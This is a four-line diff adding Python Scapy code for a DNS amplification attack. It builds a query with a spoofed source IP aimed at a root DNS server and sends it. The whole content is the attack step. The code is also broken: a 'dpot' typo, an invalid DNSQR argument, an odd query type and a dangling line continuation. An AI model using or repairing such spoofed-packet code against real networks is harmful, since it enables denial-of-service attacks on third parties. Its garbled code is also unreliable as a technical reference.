@@ -1,0 +1,4 @@
+dns_amp = IP(src="192.168.0.1", dst="b.root-servers.net")/UDP(dpot=53)/
+	   DNS(rd=1, qd=DNSQR(dst="127.0.0.1", qtype="@"))
+
+send(dns_amp)
